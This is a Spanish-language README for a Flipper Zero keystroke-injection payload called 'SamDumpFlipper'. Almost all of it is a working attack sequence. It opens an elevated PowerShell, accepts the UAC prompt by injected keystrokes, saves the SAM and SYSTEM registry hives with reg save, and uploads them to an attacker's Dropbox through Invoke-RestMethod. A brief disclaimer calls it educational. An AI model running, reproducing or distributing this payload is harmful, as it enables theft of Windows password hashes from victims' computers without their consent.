# SamDumpFlipper

## Descripción

SamDumpFlipper es un script que extrae los archivos SAM y SYSTEM del registro de Windows y los exfiltra a Dropbox utilizando Flipper Zero. Este script utiliza PowerShell para realizar las tareas necesarias y subir los archivos a Dropbox.

## Autor

- **Autor**: flippermen
- **Versión**: 2.0
- **Categoría**: Credenciales
- **Modos de Ataque**: HID

## Requisitos

- Flipper Zero
- Token de API de Dropbox
- PowerShell

## Instrucciones de Uso

### Configuración Inicial

1. **Configurar el Token de Dropbox**:
   - Reemplaza `'your token'` en el script con tu token de API de Dropbox.

### Ejecución del Script

1. **Preparar el Flipper Zero**:
   - Asegúrate de que tu Flipper Zero está configurado en modo HID.

2. **Ejecutar el Script**:
   - Ejecuta el script en tu Flipper Zero.

### Pasos del Script

1. **Minimizar todas las ventanas**:
   - `WINDOWS d`
   
2. **Abrir el diálogo de Ejecutar**:
   - `WINDOWS r`
   
3. **Abrir PowerShell con privilegios elevados**:
   - `powershell Start-Process PowerShell -Verb runAs`
   
4. **Aceptar el prompt de UAC**:
   - `ALT LEFTARROW`
   - `ALT ENTER`
   
5. **Definir el token de Dropbox y las rutas de los archivos**:
   - `$DropboxToken = 'your token'`
   - `$SamPath = 'C:\\Windows\\Temp\\sam'`
   - `$SystemPath = 'C:\\Windows\\Temp\\system'`
   
6. **Eliminar archivos existentes si los hay**:
   - `Remove-Item -Path $SamPath -Force`
   - `Remove-Item -Path $SystemPath -Force`
   
7. **Guardar los hives SAM y SYSTEM**:
   - `reg save hklm\sam $SamPath`
   - `reg save hklm\system $SystemPath`
   
8. **Leer el contenido de los archivos SAM y SYSTEM**:
   - `$SamContent = [System.IO.File]::ReadAllBytes($SamPath)`
   - `$SystemContent = [System.IO.File]::ReadAllBytes($SystemPath)`
   
9. **Subir los archivos a Dropbox utilizando Invoke-RestMethod**:
   - `Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Headers @{ 'Authorization' = "Bearer $DropboxToken"; 'Dropbox-API-Arg' = '{"path":"/sam","mode":"add","autorename":true}'; 'Content-Type' = "application/octet-stream" } -Method Post -Body $SamContent`
   - `Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Headers @{ 'Authorization' = "Bearer $DropboxToken"; 'Dropbox-API-Arg' = '{"path":"/system","mode":"add","autorename":true}'; 'Content-Type' = "application/octet-stream" } -Method Post -Body $SystemContent`
   
10. **Señalar el fin del script**:
    - `(New-Object -ComObject wscript.shell).SendKeys('{CAPSLOCK}')`

## Notas

- Asegúrate de ajustar la secuencia para aceptar el prompt de UAC de acuerdo con el idioma y la configuración de tu sistema.
- Este script está diseñado para uso educativo y de pruebas. No debe ser utilizado para actividades no autorizadas.

## Licencia

Este proyecto está licenciado bajo la Licencia MIT. Ver el archivo `LICENSE` para más detalles.
